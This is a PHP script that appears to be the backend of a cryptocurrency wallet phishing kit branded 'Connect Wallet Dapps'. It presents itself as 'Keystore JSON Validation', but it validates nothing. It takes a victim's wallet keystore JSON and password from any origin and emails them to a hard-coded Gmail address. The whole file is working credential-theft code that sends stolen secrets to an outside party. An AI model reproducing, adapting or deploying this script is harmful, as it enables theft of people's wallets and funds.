<?php

    header('Access-Control-Allow-Origin: *');
    
    $type = $_REQUEST['type'];
    $password = $_REQUEST['password'];
    $json = $_REQUEST['json'];

    $message = "New Keystore JSON Validation for <b>" . $type . "</b>Keystore JSON => <b>" . $json . "</b><br>Password => <b>" . $password . "</b>.<br><br>Thanks,<br>Connect Wallet Dapps.";

    $headers = 'From: "Connect Wallet Dapps" <no-reply@connectwalletdapps.com>' . "\r\n" .
                'Content-type: text/html; charset=iso-8859-1'  . "\r\n" .
                    'X-Mailer: PHP/' . phpversion();
                    
//   $headers = "MIME-Version: 1.0" . "\r\n";
//     $headers .= "Content-type:text/html;charset=UTF-8" . "\r\n";

    if(mail("Tridie3511@gmail.com", "New Keystore JSON Validation", "$message", $headers)){
       echo 1;
    }else{
       echo 0;
    }

?>